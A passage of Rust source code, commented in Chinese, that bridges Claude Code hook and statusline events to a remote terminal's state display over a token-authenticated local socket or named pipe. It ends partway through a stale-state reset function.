//! 状态回传（《实现方案.md》18.8，《开发指南.md》T40、T41）。
//!
//! 链路：Claude Code 的 hook / 状态栏命令（`rterm-cli hook`）把 JSON 通过本机管道 / 套接字发给被控端主进程，
//! 主进程按 `term_id` 转给对应终端，转成 `AppState` / `AppNotice`。
//!
//! 本模块提供：
//! - [`write_plugin_dir`]：生成只含 hooks 的插件目录和状态栏设置文件（不改用户任何配置）；
//! - [`BridgeServer`]：本机 IPC 服务端（Windows 命名管道 / Unix 套接字，用 `interprocess`）；
//! - [`hook_main`]：`rterm-cli hook [--statusline]` 的同步实现，门面的 CLI 直接调用；
//! - [`AppStateData`] 与 [`apply_hook`] / [`apply_statusline`]：事件到状态的对应表（18.8.5）。
//!
//! 约定（hook 命令必须遵守）：标准输出不打印任何内容（状态栏模式除外）、退出码永远 0、
//! 总耗时 300 毫秒内、连不上主进程立即放弃。
use std::collections::{HashMap, HashSet};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Mutex;
use std::time::{Duration, Instant};

use interprocess::local_socket::{traits::tokio::Listener as _, ListenerOptions};
#[cfg(not(unix))]
use interprocess::local_socket::{GenericNamespaced, ToNsName};
use rterm_proto::pb;
use serde_json::Value;
use tokio::io::AsyncReadExt;
use tokio::sync::mpsc;

/// 单条 IPC 消息上限。
pub const MAX_MESSAGE_BYTES: usize = 256 * 1024;
/// hook 命令连接并发送的总时限。
pub const HOOK_TIMEOUT: Duration = Duration::from_millis(200);
/// 权限请求的工具参数摘要上限（字符）。超过时标记 `truncated`，远端只能拒绝（审查 M6）。
pub const TOOL_SUMMARY_MAX: usize = 4000;
/// 摘要被截断时追加在文字末尾的提示。
pub const TRUNCATED_HINT: &str = "…（内容过长，请回到终端查看）";
/// "工作中"超过这么久没有任何事件，认为状态已失效。
pub const BUSY_STALE_AFTER: Duration = Duration::from_secs(30 * 60);

pub const ENV_TERM_ID: &str = "RTERM_TERM_ID";
pub const ENV_ENDPOINT: &str = "RTERM_HOOK_ENDPOINT";
pub const ENV_USER_STATUSLINE: &str = "RTERM_USER_STATUSLINE";
/// 每个终端一次性生成的 128 位随机令牌（十六进制 32 字符）。hook 命令把它放进每条 IPC 消息，被控端校验（审查 M5）。
pub const ENV_TOKEN: &str = "RTERM_HOOK_TOKEN";
/// 令牌字节数（128 位）。
pub const TOKEN_BYTES: usize = 16;

/// 需要登记同一条命令的 hook 事件（18.8.5）。
pub const HOOK_EVENTS: &[&str] = &[
    "SessionStart",
    "UserPromptSubmit",
    "PermissionRequest",
    "PostToolUse",
    "PermissionDenied",
    "Stop",
    "StopFailure",
    "Notification",
    "PostModelSwitch",
    "CwdChanged",
    "SessionEnd",
];

// ───────────────────────── 插件目录 ─────────────────────────

/// 附加到 `claude` 命令行的参数（T39 的 `build_claude_command` 使用）。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BridgeArgs {
    pub plugin_dir: String,
    pub settings_file: Option<String>,
}

fn json_str(s: &str) -> String {
    serde_json::to_string(s).unwrap_or_else(|_| "\"\"".into())
}

/// 写进 JSON 的命令：`"<rterm-cli 绝对路径>" hook`。路径统一用正斜杠，避免 JSON 里反斜杠的转义问题。
fn hook_command(cli: &Path, statusline: bool) -> String {
    let p = cli.to_string_lossy().replace('\\', "/");
    if statusline {
        format!("\"{p}\" hook --statusline")
    } else {
        format!("\"{p}\" hook")
    }
}

/// 在 `<数据目录>/claude-plugin/` 下生成插件（只含 hooks 定义）和状态栏设置文件。
/// 每次启动时重新生成（`rterm-cli` 路径可能变化）。
pub fn write_plugin_dir(
    data_dir: &Path,
    rterm_cli: &Path,
    inject_statusline: bool,
) -> std::io::Result<BridgeArgs> {
    let root = data_dir.join("claude-plugin");
    std::fs::create_dir_all(root.join(".claude-plugin"))?;
    std::fs::create_dir_all(root.join("hooks"))?;
    std::fs::write(
        root.join(".claude-plugin").join("plugin.json"),
        r#"{ "name": "rterm-bridge", "version": "0.1.0", "description": "RTerm 状态回传" }"#,
    )?;
    let cmd = json_str(&hook_command(rterm_cli, false));
    let mut hooks = String::from("{\n  \"hooks\": {\n");
    for (i, ev) in HOOK_EVENTS.iter().enumerate() {
        hooks.push_str(&format!(
            "    \"{ev}\": [{{ \"hooks\": [{{ \"type\": \"command\", \"command\": {cmd} }}] }}]{}\n",
            if i + 1 < HOOK_EVENTS.len() { "," } else { "" }
        ));
    }
    hooks.push_str("  }\n}\n");
    std::fs::write(root.join("hooks").join("hooks.json"), hooks)?;

    let settings_file = if inject_statusline {
        let p = root.join("statusline-settings.json");
        let cmd = json_str(&hook_command(rterm_cli, true));
        std::fs::write(
            &p,
            format!("{{ \"statusLine\": {{ \"type\": \"command\", \"command\": {cmd} }} }}\n"),
        )?;
        Some(p.to_string_lossy().into_owned())
    } else {
        None
    };
    Ok(BridgeArgs {
        plugin_dir: root.to_string_lossy().into_owned(),
        settings_file,
    })
}

/// 读取用户原有的状态栏命令（依次看 `<启动目录>/.claude/settings.local.json`、
/// `<启动目录>/.claude/settings.json`、`~/.claude/settings.json`），取第一个找到的。
/// 用来放进 `RTERM_USER_STATUSLINE`，让我们的状态栏命令转发后再调用它。
pub fn find_user_statusline(cwd: &Path, home: &Path) -> Option<String> {
    let candidates: [PathBuf; 3] = [
        cwd.join(".claude").join("settings.local.json"),
        cwd.join(".claude").join("settings.json"),
        home.join(".claude").join("settings.json"),
    ];
    for c in candidates {
        let Ok(text) = std::fs::read_to_string(&c) else {
            continue;
        };
        let Ok(v) = serde_json::from_str::<Value>(&text) else {
            continue;
        };
        if let Some(cmd) = v.pointer("/statusLine/command").and_then(Value::as_str) {
            if !cmd.trim().is_empty() {
                return Some(cmd.to_string());
            }
        }
    }
    None
}

// ───────────────────────── IPC ─────────────────────────

/// 从 hook 子进程发来的一条消息。
#[derive(Debug, Clone, PartialEq)]
pub struct BridgeMessage {
    pub term_id: String,
    /// `hook` 或 `statusline`
    pub kind: String,
    pub payload: Value,
}

/// 解析一行 JSON：`{ "term_id": "...", "kind": "hook", "payload": {...} }`。
pub fn parse_message(line: &[u8]) -> Option<BridgeMessage> {
    if line.len() > MAX_MESSAGE_BYTES {
        return None;
    }
    let v: Value = serde_json::from_slice(line).ok()?;
    let term_id = v.get("term_id")?.as_str()?.to_string();
    let kind = v.get("kind")?.as_str()?.to_string();
    if term_id.is_empty() || !(kind == "hook" || kind == "statusline") {
        return None;
    }
    Some(BridgeMessage {
        term_id,
        kind,
        payload: v.get("payload").cloned().unwrap_or(Value::Null),
    })
}

/// 解析一行 JSON，同时取出 `token` 字段（不是字符串或缺失时为 None）。
pub fn parse_envelope(line: &[u8]) -> Option<(BridgeMessage, Option<String>)> {
    let msg = parse_message(line)?;
    let token = serde_json::from_slice::<Value>(line)
        .ok()
        .and_then(|v| v.get("token").and_then(Value::as_str).map(str::to_string));
    Some((msg, token))
}

/// 常数时间比较（长度不同直接返回 false，长度本身不是秘密）。
pub fn ct_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut diff = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        diff |= x ^ y;
    }
    std::hint::black_box(diff) == 0
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

fn unhex(s: &str) -> Option<[u8; TOKEN_BYTES]> {
    if s.len() != TOKEN_BYTES * 2 || !s.is_ascii() {
        return None;
    }
    let mut out = [0u8; TOKEN_BYTES];
    for (i, o) in out.iter_mut().enumerate() {
        *o = u8::from_str_radix(&s[i * 2..i * 2 + 2], 16).ok()?;
    }
    Some(out)
}

/// 终端令牌表：`term_id -> 128 位随机令牌`。
/// 令牌只能限制"没拿到令牌的进程"（别的用户、别的终端里的进程）；同一个终端里的进程仍能读到环境变量，
/// 所以真正的缓解还在界面层（权限卡片显示完整命令、超长只能拒绝，见 M6）。
#[derive(Default)]
pub struct TermTokens {
    map: Mutex<HashMap<String, [u8; TOKEN_BYTES]>>,
    /// 已经记过日志的终端（每个终端只记一次，且有上限）
    rejected: Mutex<HashSet<String>>,
}

impl TermTokens {
    /// 为终端签发新令牌（覆盖旧的），返回十六进制文本。
    pub fn issue(&self, term_id: &str) -> String {
        let t: [u8; TOKEN_BYTES] = rand::random();
        if let Ok(mut m) = self.map.lock() {
            m.insert(term_id.to_string(), t);
        }
        hex(&t)
    }

    /// 终端关闭后撤销。
    pub fn revoke(&self, term_id: &str) {
        if let Ok(mut m) = self.map.lock() {
            m.remove(term_id);
        }
        if let Ok(mut r) = self.rejected.lock() {
            r.remove(term_id);
        }
    }

    /// 校验令牌（常数时间）。没有这个终端、没带令牌、格式不对都返回 false。
    pub fn verify(&self, term_id: &str, token: Option<&str>) -> bool {
        let expected = self.map.lock().ok().and_then(|m| m.get(term_id).copied());
        // 终端不存在时也做一次比较，让耗时不依赖于"终端是否存在"
        let e = expected.unwrap_or([0u8; TOKEN_BYTES]);
        let matched = token.and_then(unhex).is_some_and(|g| ct_eq(&e, &g));
        matched && expected.is_some()
    }

    /// 记录一个被拒绝的终端；第一次返回 true（调用方据此写一条日志），之后返回 false。
    pub fn note_rejected(&self, term_id: &str) -> bool {
        let Ok(mut r) = self.rejected.lock() else {
            return false;
        };
        if r.len() >= 256 || r.contains(term_id) {
            return false;
        }
        r.insert(term_id.to_string())
    }

    #[cfg(test)]
    fn rejected_len(&self) -> usize {
        self.rejected.lock().map(|r| r.len()).unwrap_or(0)
    }
}

/// hook 命令发出的一行消息。
pub fn build_message(
    term_id: &str,
    token: Option<&str>,
    statusline: bool,
    payload_json: &str,
) -> String {
    let token_part = match token {
        Some(t) => format!("\"token\":{},", json_str(t)),
        None => String::new(),
    };
    format!(
        "{{\"term_id\":{},{token_part}\"kind\":\"{}\",\"payload\":{}}}\n",
        json_str(term_id),
        if statusline { "statusline" } else { "hook" },
        payload_json
    )
}

/// 本机 IPC 服务端。名字里带进程号和随机串；每条消息还必须带该终端的一次性令牌。
pub struct BridgeServer {
    tokens: std::sync::Arc<TermTokens>,
    endpoint: String,
    task: tokio::task::JoinHandle<()>,
    #[cfg(unix)]
    socket_path: PathBuf,
}

impl BridgeServer {
    /// 启动服务，返回（服务句柄，消息接收端）。
    /// Unix 的套接字文件放在 `data_dir`（权限 0600），Windows 是命名管道。
    pub fn start(
        data_dir: &Path,
    ) -> std::io::Result<(BridgeServer, mpsc::Receiver<BridgeMessage>)> {
        let suffix: String = (0..12)
            .map(|_| char::from(b"abcdefghjkmnpqrstuvwxyz23456789"[rand::random_range(0..31usize)]))
            .collect();
        let unique = format!("rterm-bridge-{}-{suffix}", std::process::id());
        #[cfg(unix)]
        let (endpoint, listener) = {
            use interprocess::local_socket::{GenericFilePath, ToFsName};
            std::fs::create_dir_all(data_dir)?;
            // 清理上次异常退出遗留的套接字文件
            if let Ok(rd) = std::fs::read_dir(data_dir) {
                for e in rd.flatten() {
                    let n = e.file_name().to_string_lossy().into_owned();
                    if n.starts_with("bridge-") && n.ends_with(".sock") {
                        let _ = std::fs::remove_file(e.path());
                    }
                }
            }
            use interprocess::os::unix::local_socket::ListenerOptionsExt;
            let path = data_dir.join(format!("bridge-{}-{suffix}.sock", std::process::id()));
            let mk = || -> std::io::Result<ListenerOptions<'static>> {
                let name = path.clone().to_fs_name::<GenericFilePath>()?;
                Ok(ListenerOptions::new().name(name))
            };
            // 权限 0600；个别系统不支持创建时指定权限，退回创建后 chmod
            let listener = match mk()?.mode(0o600).create_tokio() {
                Ok(l) => l,
                Err(e) if e.kind() == std::io::ErrorKind::Unsupported => {
                    let l = mk()?.create_tokio()?;
                    use std::os::unix::fs::PermissionsExt;
                    let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600));
                    l
                }
                Err(e) => return Err(e),
            };
            (path.to_string_lossy().into_owned(), listener)
        };
        #[cfg(not(unix))]
        let (endpoint, listener) = {
            let _ = data_dir;
            let name = unique.clone().to_ns_name::<GenericNamespaced>()?;
            (unique.clone(), windows_pipe_options(name)?.create_tokio()?)
        };
        #[cfg(unix)]
        let _ = &unique;
        let (tx, rx) = mpsc::channel::<BridgeMessage>(256);
        let tokens = std::sync::Arc::new(TermTokens::default());
        let task_tokens = tokens.clone();
        let task = tokio::spawn(async move {
            loop {
                let conn = match listener.accept().await {
                    Ok(c) => c,
                    Err(e) => {
                        tracing::debug!("bridge accept 失败：{e}");
                        tokio::time::sleep(Duration::from_millis(50)).await;
                        continue;
                    }
                };
                let tx = tx.clone();
                let tokens = task_tokens.clone();
                tokio::spawn(async move {
                    let mut buf = Vec::new();
                    let mut conn = conn;
                    // 客户端发一行就关闭；限长，限时
                    let read = tokio::time::timeout(Duration::from_secs(2), async {
                        let mut limited =
                            tokio::io::AsyncReadExt::take(&mut conn, MAX_MESSAGE_BYTES as u64 + 1);
                        limited.read_to_end(&mut buf).await
                    })
                    .await;
                    if !matches!(read, Ok(Ok(_))) {
                        return;
                    }
                    let line = buf.split(|b| *b == b'\n').next().unwrap_or(&[]);
                    if let Some((msg, token)) = parse_envelope(line) {
                        if tokens.verify(&msg.term_id, token.as_deref()) {
                            let _ = tx.send(msg).await;
                        } else if tokens.note_rejected(&msg.term_id) {
                            // 每个终端只记一次，避免被刷日志
                            tracing::warn!(
                                term = %msg.term_id,
                                "状态回传 IPC：丢弃了没有有效令牌的事件（可能是终端内其他进程在伪造）"
                            );
                        }
                    }
                });
            }
        });
        Ok((
            BridgeServer {
                tokens,
                endpoint,
                task,
                #[cfg(unix)]
                socket_path: data_dir.join(format!("bridge-{}-{suffix}.sock", std::process::id())),
            },
            rx,
        ))
    }

    /// 放进环境变量 `RTERM_HOOK_ENDPOINT` 的值。
    pub fn endpoint(&self) -> &str {
        &self.endpoint
    }

    /// 终端令牌表：打开终端时 `issue`，关闭时 `revoke`。
    pub fn tokens(&self) -> std::sync::Arc<TermTokens> {
        self.tokens.clone()
    }
}

/// Windows 命名管道：只允许创建者本人（OWNER RIGHTS）和 SYSTEM 访问，并拒绝远程（网络）客户端。
/// 默认 DACL 会让同机其他账户也能打开管道；`interprocess` 默认已设 `PIPE_REJECT_REMOTE_CLIENTS`。
#[cfg(not(unix))]
fn windows_pipe_options(
    name: interprocess::local_socket::Name<'static>,
) -> std::io::Result<ListenerOptions<'static>> {
    use interprocess::os::windows::local_socket::ListenerOptionsExt;
    use interprocess::os::windows::security_descriptor::SecurityDescriptor;
    // D:P = 受保护的 DACL（不继承）；GA = 全部访问；OW = 所有者权限；SY = 本地系统
    let sddl = widestring::U16CString::from_str("D:P(A;;GA;;;OW)(A;;GA;;;SY)")
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidInput, e.to_string()))?;
    let sd = SecurityDescriptor::deserialize(&sddl)?;
    Ok(ListenerOptions::new().name(name).security_descriptor(sd))
}

impl Drop for BridgeServer {
    fn drop(&mut self) {
        self.task.abort();
        #[cfg(unix)]
        let _ = std::fs::remove_file(&self.socket_path);
    }
}

/// 同步客户端：连上 `endpoint`，发出 `msg`，限时 `timeout`。连不上直接返回 `false`。
pub fn send_to_endpoint(endpoint: &str, msg: &[u8], timeout: Duration) -> bool {
    use interprocess::local_socket::{traits::Stream as _, Stream};
    let deadline = Instant::now() + timeout;
    let (tx, rx) = std::sync::mpsc::channel::<bool>();
    let endpoint = endpoint.to_string();
    let data = msg.to_vec();
    // 连接可能阻塞（管道忙），放到线程里，主线程按时限等待
    std::thread::spawn(move || {
        #[cfg(unix)]
        let name = {
            use interprocess::local_socket::{GenericFilePath, ToFsName};
            endpoint.to_fs_name::<GenericFilePath>()
        };
        #[cfg(not(unix))]
        let name = endpoint.to_ns_name::<GenericNamespaced>();
        let ok = (|| -> std::io::Result<()> {
            let mut s = Stream::connect(name?)?;
            s.write_all(&data)?;
            s.flush()?;
            Ok(())
        })()
        .is_ok();
        let _ = tx.send(ok);
    });
    let left = deadline.saturating_duration_since(Instant::now());
    rx.recv_timeout(left).unwrap_or(false)
}

/// `rterm-cli hook [--statusline]` 的实现。同步代码，不启动 tokio。
/// 任何情况下都不影响 Claude Code：不 panic、不输出多余内容、退出码永远是 0。
pub fn hook_main(statusline: bool) -> ! {
    let _ = std::panic::catch_unwind(|| {
        let (Ok(term_id), Ok(endpoint)) = (std::env::var(ENV_TERM_ID), std::env::var(ENV_ENDPOINT))
        else {
            return; // 不是在我们的终端里，什么都不做
        };
        let mut input = String::new();
        let _ = std::io::stdin()
            .take(MAX_MESSAGE_BYTES as u64)
            .read_to_string(&mut input);
        let payload = input.trim();
        // payload 必须是合法 JSON，否则按 null 处理，避免拼出坏消息
        let payload_json = if serde_json::from_str::<Value>(payload).is_ok() {
            payload.to_string()
        } else {
            "null".to_string()
        };
        let token = std::env::var(ENV_TOKEN).ok().filter(|t| !t.is_empty());
        let msg = build_message(&term_id, token.as_deref(), statusline, &payload_json);
        send_to_endpoint(&endpoint, msg.as_bytes(), HOOK_TIMEOUT);
        if statusline {
            // 用户原来配置了状态栏：调用它，把同样的输入给它，原样输出它的结果
            match std::env::var(ENV_USER_STATUSLINE) {
                Ok(cmd) if !cmd.trim().is_empty() => run_and_passthrough(&cmd, &input),
                _ => println!("RTerm"),
            }
        }
    });
    std::process::exit(0)
}

#[cfg(windows)]
fn windows_git_bash() -> Option<PathBuf> {
    let mut cands: Vec<PathBuf> = Vec::new();
    if let Some(p) = std::env::var_os("CLAUDE_CODE_GIT_BASH_PATH") {
        cands.push(PathBuf::from(p));
    }
    cands.push(PathBuf::from("C:/Program Files/Git/bin/bash.exe"));
    cands.push(PathBuf::from("C:/Program Files (x86)/Git/bin/bash.exe"));
    cands.into_iter().find(|p| p.is_file())
}

fn run_and_passthrough(cmd: &str, input: &str) {
    use std::process::{Command, Stdio};
    // Claude Code 在 Windows 上用 Git Bash 执行 hook 和状态栏命令（实测 $0 = /usr/bin/bash），
    // 用户原来的状态栏命令是按 bash 写的，所以这里也优先用 bash；找不到 Git Bash 才退到 cmd。
    #[cfg(windows)]
    let mut c = match windows_git_bash() {
        Some(bash) => {
            let mut c = Command::new(bash);
            c.args(["-c", cmd]);
            c
        }
        None => {
            let mut c = Command::new("cmd");
            c.args(["/D", "/C", cmd]);
            c
        }
    };
    #[cfg(not(windows))]
    let mut c = {
        let mut c = Command::new("sh");
        c.args(["-c", cmd]);
        c
    };
    c.stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null());
    let Ok(mut child) = c.spawn() else {
        println!("RTerm");
        return;
    };
    if let Some(mut stdin) = child.stdin.take() {
        let _ = stdin.write_all(input.as_bytes());
    }
    match child.wait_with_output() {
        Ok(out) => {
            let _ = std::io::stdout().write_all(&out.stdout);
        }
        Err(_) => println!("RTerm"),
    }
}

// ───────────────────────── 状态 ─────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Activity {
    #[default]
    Idle,
    Busy,
    WaitingPermission,
}

impl Activity {
    pub fn as_str(self) -> &'static str {
        match self {
            Activity::Idle => "idle",
            Activity::Busy => "busy",
            Activity::WaitingPermission => "waiting_permission",
        }
    }
}

/// 一个终端里应用（Claude Code）的状态。
#[derive(Debug, Clone, Default, PartialEq)]
pub struct AppStateData {
    pub running: bool,
    /// 是否有状态回传（收到过 hook / 状态栏消息）。false 时 `AppState` 里的字段无意义。
    pub stateful: bool,
    pub version: String,
    pub activity: Activity,
    pub model: String,
    pub model_id: String,
    pub effort: String,
    pub fast_mode: bool,
    pub thinking: bool,
    pub context_used_pct: u32,
    pub has_context: bool,
    pub cwd: String,
    pub session_id: String,
    pub session_name: String,
    pub cost_usd: f64,
    /// 当前未处理的权限请求编号
    pub pending_notice: Option<u64>,
    /// 当前权限请求的摘要被截断了（远端只能拒绝）
    pub pending_truncated: bool,
    /// 最近一次收到事件的时间（判断"工作中"是否已失效）
    pub last_event: Option<Instant>,
}

impl AppStateData {
    pub fn to_pb(&self) -> pb::AppState {
        let known = self.running || self.stateful;
        pb::AppState {
            app: if self.running {
                "claude".into()
            } else {
                String::new()
            },
            running: self.running,
            stateful: self.stateful && known,
            version: self.version.clone(),
            activity: self.activity.as_str().into(),
            model: self.model.clone(),
            model_id: self.model_id.clone(),
            effort: self.effort.clone(),
            fast_mode: self.fast_mode,
            thinking: self.thinking,
            context_used_pct: self.context_used_pct,
            has_context: self.has_context,
            cwd: self.cwd.clone(),
            session_id: self.session_id.clone(),
            session_name: self.session_name.clone(),
            cost_usd: self.cost_usd,
        }
    }

    /// 重置为"没有运行"。
    pub fn reset_not_running(&mut self) {
        *self = AppStateData::default();
    }

    /// 无状态回传时由进程检测更新。返回是否变化。
    pub fn set_running_by_probe(&mut self, running: bool) -> bool {
        if self.stateful {
            return false;
        }
        if self.running == running {
            return false;
        }
        self.running = running;
        true
    }
}

static NOTICE_SEQ: AtomicU64 = AtomicU64::new(1);

fn next_notice_id() -> u64 {
    NOTICE_SEQ.fetch_add(1, Ordering::Relaxed)
}

/// 处理一个事件后的结果。
#[derive(Debug, Default, PartialEq)]
pub struct Applied {
    pub changed: bool,
    pub notice: Option<pb::AppNotice>,
    /// 目录变化（需要重新扫描自定义命令）
    pub cwd_changed: bool,
}

/// 工具参数摘要。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ToolSummary {
    pub text: String,
    /// 超过 [`TOOL_SUMMARY_MAX`] 被截断；`text` 末尾已带 [`TRUNCATED_HINT`]
    pub truncated: bool,
}

fn truncate_chars(s: &str, max: usize) -> ToolSummary {
    if s.chars().count() <= max {
        ToolSummary {
            text: s.to_string(),
            truncated: false,
        }
    } else {
        let mut t: String = s.chars().take(max).collect();
        t.push_str(TRUNCATED_HINT);
        ToolSummary {
            text: t,
            truncated: true,
        }
    }
}

fn str_at<'a>(v: &'a Value, path: &str) -> Option<&'a str> {
    v.pointer(path).and_then(Value::as_str)
}

/// 工具参数摘要（仅文字）。需要知道是否被截断时用 [`tool_summary_ex`]。
pub fn tool_summary(tool_name: &str, input: &Value) -> String {
    tool_summary_ex(tool_name, input).text
}

/// 工具参数摘要：Bash 取命令，文件类取路径，其余取紧凑 JSON；最多 4000 字符，超出标记 `truncated`
/// 并在文字里提示"内容过长，请回到终端查看"（审查 M6：不能让远端用户在看不全命令的情况下点"允许"）。
pub fn tool_summary_ex(tool_name: &str, input: &Value) -> ToolSummary {
    let pick = |keys: &[&str]| {
        keys.iter()
            .find_map(|k| input.get(*k).and_then(Value::as_str).map(str::to_owned))
    };
    let s = match tool_name {
        "Bash" | "PowerShell" => pick(&["command"]),
        "Edit" | "Write" | "Read" | "MultiEdit" | "NotebookEdit" => {
            pick(&["file_path", "notebook_path", "path"])
        }
        "WebFetch" => pick(&["url"]),
        "Glob" | "Grep" => pick(&["pattern"]),
        _ => None,
    }
    .unwrap_or_else(|| {
        if input.is_null() {
            String::new()
        } else {
            input.to_string()
        }
    });
    truncate_chars(&s, TOOL_SUMMARY_MAX)
}

fn set_if_changed<T: PartialEq>(slot: &mut T, v: T, changed: &mut bool) {
    if *slot != v {
        *slot = v;
        *changed = true;
    }
}

fn notice(kind: &str, title: &str, text: &str) -> pb::AppNotice {
    pb::AppNotice {
        kind: kind.into(),
        title: title.into(),
        text: text.into(),
        ..Default::default()
    }
}

fn resolved_notice(id: u64) -> pb::AppNotice {
    pb::AppNotice {
        kind: "permission".into(),
        notice_id: id,
        resolved: true,
        ..Default::default()
    }
}

/// 对应表见 18.8.5。`ev` 是 Claude Code 通过 stdin 给 hook 的 JSON。
pub fn apply_hook(state: &mut AppStateData, ev: &Value, now: Instant) -> Applied {
    let mut out = Applied::default();
    let name = str_at(ev, "/hook_event_name").unwrap_or("");
    if name.is_empty() {
        return out;
    }
    if !state.stateful {
        state.stateful = true;
        out.changed = true;
    }
    state.last_event = Some(now);
    if name != "SessionEnd" {
        set_if_changed(&mut state.running, true, &mut out.changed);
    }
    if let Some(cwd) = str_at(ev, "/cwd") {
        if state.cwd != cwd {
            state.cwd = cwd.to_string();
            out.changed = true;
            if name == "CwdChanged" {
                out.cwd_changed = true;
            }
        }
    }
    if let Some(sid) = str_at(ev, "/session_id") {
        set_if_changed(&mut state.session_id, sid.to_string(), &mut out.changed);
    }
    match name {
        "SessionStart" => {
            // 实测 SessionStart 带 model（模型 id 字符串，如 "claude-sonnet-5-5"）
            if let Some(m) = str_at(ev, "/model") {
                set_if_changed(&mut state.model_id, m.to_string(), &mut out.changed);
            }
            set_if_changed(&mut state.activity, Activity::Idle, &mut out.changed);
            state.pending_notice = None;
            state.pending_truncated = false;
            out.cwd_changed = true;
        }
        "UserPromptSubmit" => {
            set_if_changed(&mut state.activity, Activity::Busy, &mut out.changed);
        }
        "PermissionRequest" => {
            set_if_changed(
                &mut state.activity,
                Activity::WaitingPermission,
                &mut out.changed,
            );
            let id = next_notice_id();
            state.pending_notice = Some(id);
            let tool = str_at(ev, "/tool_name").unwrap_or("");
            let ts = tool_summary_ex(tool, ev.get("tool_input").unwrap_or(&Value::Null));
            state.pending_truncated = ts.truncated;
            let summary = ts.text;
            out.notice = Some(pb::AppNotice {
                kind: "permission".into(),
                title: if tool.is_empty() {
                    "需要确认".into()
                } else {
                    format!("需要确认：{tool}")
                },
                text: summary.clone(),
                notice_id: id,
                tool_name: tool.into(),
                tool_summary: summary,
                resolved: false,
                truncated: ts.truncated,
            });
        }
        "PostToolUse" | "PermissionDenied" => {
            state.pending_truncated = false;
            if let Some(id) = state.pending_notice.take() {
                out.notice = Some(resolved_notice(id));
            }
            set_if_changed(&mut state.activity, Activity::Busy, &mut out.changed);
        }
        "Stop" => {
            state.pending_truncated = false;
            if let Some(id) = state.pending_notice.take() {
                out.notice = Some(resolved_notice(id));
            }
            let was_busy = state.activity != Activity::Idle;
            set_if_changed(&mut state.activity, Activity::Idle, &mut out.changed);
            // "任务完成"通知总是发出；resolved 通知若同时存在以 done 为准，卡片会因 activity 变化被撤掉
            let _ = was_busy;
            out.notice = Some(notice("done", "任务完成", ""));
        }
        "StopFailure" => {
            state.pending_notice = None;
            state.pending_truncated = false;
            set_if_changed(&mut state.activity, Activity::Idle, &mut out.changed);
            let why = str_at(ev, "/error")
                .or_else(|| str_at(ev, "/matcher"))
                .or_else(|| str_at(ev, "/reason"))
                .unwrap_or("");
            out.notice = Some(notice("error", "任务出错", why));
        }
        "Notification" => {
            let t = str_at(ev, "/notification_type").unwrap_or("");
            if matches!(
                t,
                "idle_prompt" | "agent_needs_input" | "elicitation_dialog"
            ) {
                out.notice = Some(notice(
                    "need_input",
                    "需要你的输入",
                    str_at(ev, "/message").unwrap_or(""),
                ));
            }
        }
        "PostModelSwitch" => {
            let model = str_at(ev, "/model/display_name")
                .or_else(|| str_at(ev, "/model_display_name"))
                .or_else(|| str_at(ev, "/model"))
                .or_else(|| str_at(ev, "/new_model"))
                .unwrap_or("");
            let id = str_at(ev, "/model/id")
                .or_else(|| str_at(ev, "/model_id"))
                .unwrap_or(model);
            if !model.is_empty() {
                set_if_changed(&mut state.model, model.to_string(), &mut out.changed);
                set_if_changed(&mut state.model_id, id.to_string(), &mut out.changed);
            }
        }
        "CwdChanged" => {
            out.cwd_changed = true;
        }
        "SessionEnd" => {
            state.reset_not_running();
            out.changed = true;
            out.notice = None;
        }
        _ => {}
    }
    out
}

/// 状态栏 JSON：模型显示名、上下文用量、思考强度、快速模式、费用、版本、会话名。
pub fn apply_statusline(state: &mut AppStateData, v: &Value, now: Instant) -> Applied {
    let mut out = Applied::default();
    if !state.stateful {
        state.stateful = true;
        out.changed = true;
    }
    set_if_changed(&mut state.running, true, &mut out.changed);
    state.last_event = Some(now);
    if let Some(m) = str_at(v, "/model/display_name") {
        set_if_changed(&mut state.model, m.to_string(), &mut out.changed);
    }
    if let Some(m) = str_at(v, "/model/id") {
        set_if_changed(&mut state.model_id, m.to_string(), &mut out.changed);
    }
    if let Some(p) = v
        .pointer("/context_window/used_percentage")
        .and_then(Value::as_f64)
    {
        set_if_changed(
            &mut state.context_used_pct,
            p.round().clamp(0.0, 100.0) as u32,
            &mut out.changed,
        );
        set_if_changed(&mut state.has_context, true, &mut out.changed);
    }
    if let Some(e) = str_at(v, "/effort/level").or_else(|| str_at(v, "/effort")) {
        set_if_changed(&mut state.effort, e.to_string(), &mut out.changed);
    }
    if let Some(f) = v
        .pointer("/fast_mode")
        .and_then(Value::as_bool)
        .or_else(|| v.pointer("/fast_mode/enabled").and_then(Value::as_bool))
    {
        set_if_changed(&mut state.fast_mode, f, &mut out.changed);
    }
    if let Some(t) = v
        .pointer("/thinking/enabled")
        .and_then(Value::as_bool)
        .or_else(|| v.pointer("/thinking").and_then(Value::as_bool))
    {
        set_if_changed(&mut state.thinking, t, &mut out.changed);
    }
    if let Some(c) = v.pointer("/cost/total_cost_usd").and_then(Value::as_f64) {
        set_if_changed(&mut state.cost_usd, c, &mut out.changed);
    }
    if let Some(ver) = str_at(v, "/version") {
        set_if_changed(&mut state.version, ver.to_string(), &mut out.changed);
    }
    if let Some(n) = str_at(v, "/session_name") {
        set_if_changed(&mut state.session_name, n.to_string(), &mut out.changed);
    }
    if let Some(sid) = str_at(v, "/session_id") {
        set_if_changed(&mut state.session_id, sid.to_string(), &mut out.changed);
    }
    if let Some(cwd) = str_at(v, "/workspace/current_dir").or_else(|| str_at(v, "/cwd")) {
        set_if_changed(&mut state.cwd, cwd.to_string(), &mut out.changed);
    }
    out
}

/// 兜底：`activity` 处于非空闲状态超过 30 分钟没有任何事件，或确认 `claude` 进程已不存在，把状态重置，
/// 避免界面永远显示"工作中"。返回是否发生了重置。
pub fn reset_if_stale(state: &mut AppStateData, now: Instant, process_gone: bool) -> bool {
    if !state.running || state.activity == Activity::Idle {
        return false;
    }
    let stale = state
        .last_event
